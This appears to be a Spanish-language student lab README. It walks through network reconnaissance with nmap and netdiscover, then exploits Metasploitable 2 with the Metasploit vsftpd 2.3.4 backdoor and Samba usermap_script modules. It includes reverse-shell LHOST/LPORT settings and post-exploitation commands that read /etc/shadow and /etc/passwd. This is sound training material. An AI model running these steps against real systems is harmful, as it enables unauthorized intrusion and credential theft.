# Laboratorio-1-corte-2

La practica se realiza con virtualbox, se descarga maquina virtual de Kali Linux y Metasploitable 2
<img width="1054" height="514" alt="image" src="https://github.com/user-attachments/assets/a7a3e350-13ca-4afd-9e10-0ba1c206428a" />

Se procede a verificar la IP de la victima en Metasploitable con el comando IFCONFIG, en la parte inet addr, aparece dicha IP.
<img width="773" height="493" alt="image" src="https://github.com/user-attachments/assets/540eb9c5-d42b-49e3-bd76-3c0d377f55ef" />

# Entendiendo los Tipos de Red en VMware
# Bridged (Puente)
<img width="1007" height="400" alt="image" src="https://github.com/user-attachments/assets/0eb58440-780e-43a6-8430-7f96c463cfd5" />
Se pone maquina virtual en puente y la otra en NAT, se observa comunicación.
<img width="1826" height="923" alt="Captura de pantalla 2026-04-24 122110" src="https://github.com/user-attachments/assets/cde6c1d8-ff85-49f5-9bbf-097121bf7dd5" />
# NAT (Network Address Translation):
<img width="995" height="444" alt="image" src="https://github.com/user-attachments/assets/64354a93-fb83-4b95-8f65-9b1e413419bf" />
# Host-only (Solo Anfitrión): 
Se pone las maquinas solo anfitrión
<img width="697" height="311" alt="image" src="https://github.com/user-attachments/assets/0735f2e9-59cc-4cf8-be36-4141e72f2716" />
<img width="1033" height="431" alt="image" src="https://github.com/user-attachments/assets/1ab1bf9a-16b9-4ab0-a01b-712c46788062" />
Se valida la IP en ambas maquinas 
<img width="1410" height="657" alt="image" src="https://github.com/user-attachments/assets/8b230ba0-b2a8-4b00-bc1f-c487cc1c561b" />

# 6.2 Reconocimiento y Escaneo de Vulnerabilidades con Nmap
Escaneo de la Red con Nmap, con el comando nmap -sn 192.168.X.0/24 para mirar la subred para hosts activos
<img width="1195" height="335" alt="image" src="https://github.com/user-attachments/assets/feec86b2-cba9-4904-aa36-cda78e19f99e" />
# netdiscover es una excelente herramienta para el descubrimiento de hosts en redes locales (puede requerir sudo):
Podemos observar los host que estan conectados. 
<img width="1077" height="311" alt="image" src="https://github.com/user attachments/assets/d806d093-5cdf-4363-bdf6-82c99ad919a0" />

Identifique la IP de Metasploitable 2. Para el resto de la práctica.
<img width="732" height="113" alt="image" src="https://github.com/user-attachments/assets/3822d5eb-76ed-4967-b6ff-54efe0a3ca52" />

# 6.2.2 Escaneo Detallado de Puertos y Servicios con Nmap 
Se procede a realizar el escaneo de la vistima para verificar los puertos 
# Desglose de los flags de Nmap:
<img width="856" height="360" alt="image" src="https://github.com/user-attachments/assets/401880c1-c0fb-4797-83d2-60c6caa57356" />
<img width="811" height="926" alt="image" src="https://github.com/user-attachments/assets/96acb2a0-ef1d-4912-a6e0-ab37255ea1f5" />
<img width="840" height="843" alt="image" src="https://github.com/user-attachments/assets/78684706-b7a1-4b62-8952-8029d43107c2" />

# 6.3 Explotación de Vulnerabilidades con Metasploit Framework
Iniciar Metasploit Framework: 
Se pone el comando msfconsole para abrir metasploit en Kali 
<img width="1026" height="521" alt="image" src="https://github.com/user-attachments/assets/55f3c571-f1ac-4d00-acb8-0f957bdcc042" />
Buscar el Exploit Apropiado: Dentro de msfconsole, use el comando search para encontrar exploits relacionados con vsftpd 2.3.4:
<img width="950" height="226" alt="image" src="https://github.com/user-attachments/assets/c0634f3d-add2-406f-9ec6-e71570742939" />
Seleccionar el Exploit: Cargue el exploit utilizando el comando use y el nombre
completo del módulo:
# use exploit/unix/ftp/vsftpd_234_backdoor
<img width="690" height="70" alt="image" src="https://github.com/user-attachments/assets/e8f364eb-8986-4c9b-9761-bf93cc63496f" />
Configurar las Opciones del Exploit: Es fundamental configurar las opciones correctas
para que el exploit funcione. Use show options para ver qué parámetros son necesarios:
# show options
<img width="902" height="517" alt="image" src="https://github.com/user-attachments/assets/080b219e-e46e-44a0-b18c-941829c35891" />
4

<img width="725" height="87" alt="image" src="https://github.com/user-attachments/assets/4f22e31f-0ebf-4495-b019-f31276e1cecb" />

set RHOSTS 192.168.56.102
# exploit
<img width="913" height="402" alt="image" src="https://github.com/user-attachments/assets/c7a7466a-2c9e-4c61-baf3-88cfce6096be" />
# comandos de Linux para verificar su acceso y privilegios:
<img width="355" height="142" alt="image" src="https://github.com/user-attachments/assets/a6a170dd-fc7f-46a7-9cef-b05434729af7" />
Resultado: Se obtuvo acceso remoto con privilegios de superusuario (root) de forma inmediata, sin necesidad de realizar escalada de privilegios posterior.
<img width="692" height="606" alt="image" src="https://github.com/user-attachments/assets/eeeb0a75-89d7-4b70-922c-3e8615f57bbe" />

# 6.3.2 Explotación de Samba usermap script

# Buscar el Exploit Apropiado: Si aún está en la sesión de Metasploit, puede salir de la shell actual escribiendo exit y luego buscar el nuevo exploit:
Comando: search samba usermap script
<img width="1017" height="193" alt="image" src="https://github.com/user-attachments/assets/676c16ff-711d-44d8-80d3-05602b095b0f" />
# use exploit/multi/samba/usermap_script
# show options
<img width="1015" height="532" alt="image" src="https://github.com/user-attachments/assets/45b58ed3-4a29-4a8a-9061-b4afc48a3b74" />
# show options
set LHOST 192.168.X.Z # IP de Kali Linux
set LPORT 4444 # Puerto de escucha en Kali
<img width="1033" height="478" alt="image" src="https://github.com/user-attachments/assets/23974f76-a855-43ba-b3a7-639a4ba1f06b" />
<img width="981" height="115" alt="image" src="https://github.com/user-attachments/assets/b7cb2d59-161f-42b2-9149-e591f08d2997" />


# 6.4 Post-Explotación Detallada
Verificar Usuario Actual y Privilegios: 
- Confirme que tiene privilegios de root (uid=0).
- Información del Sistema Operativo:
- <img width="432" height="82" alt="image" src="https://github.com/user-attachments/assets/c4cbdf89-861d-40af-9d20-55556c8f8f9f" />
uname -a # Información del kernel y arquitectura
cat /etc/os-release # Detalles de la distribución Linux
cat /etc/issue # Información de la versión del sistema
<img width="976" height="310" alt="image" src="https://github.com/user-attachments/assets/06b525f5-26b0-4775-9a1b-5d79e8c111d5" />

# ifconfig -a # Todas las interfaces de red
<img width="728" height="507" alt="image" src="https://github.com/user-attachments/assets/14effc8d-9f3b-44f4-9ae8-ce1ff88e5776" />

# ip a # Alternativa a ifconfig
<img width="767" height="195" alt="image" src="https://github.com/user-attachments/assets/92538ac9-9e02-488b-a1bf-85de558fb3b9" />

# netstat -tulnp # Puertos abiertos y servicios escuchando (requiere root)
<img width="878" height="828" alt="image" src="https://github.com/user-attachments/assets/36e16db2-8e24-466c-8c9b-389468436e7f" />
# netstat -antp # Conexiones TCP y UDP activas (requiere root)
<img width="917" height="823" alt="image" src="https://github.com/user-attachments/assets/ff4de5a4-ca2a-4052-8dbe-4fb67da26470" />
# route -n # Tabla de enrutamiento
<img width="782" height="96" alt="image" src="https://github.com/user-attachments/assets/b3e88398-a852-4a86-a8c2-727005c62bbe" />
# - Usuarios y Grupos del Sistema:
cat /etc/passwd # Lista de usuarios del sistema
cat /etc/shadow # Contraseñas hasheadas (solo legible por root)
cat /etc/group # Grupos del sistema
<img width="642" height="818" alt="image" src="https://github.com/user-attachments/assets/65c21406-f75b-41a8-97e3-355c7941d062" />
 







































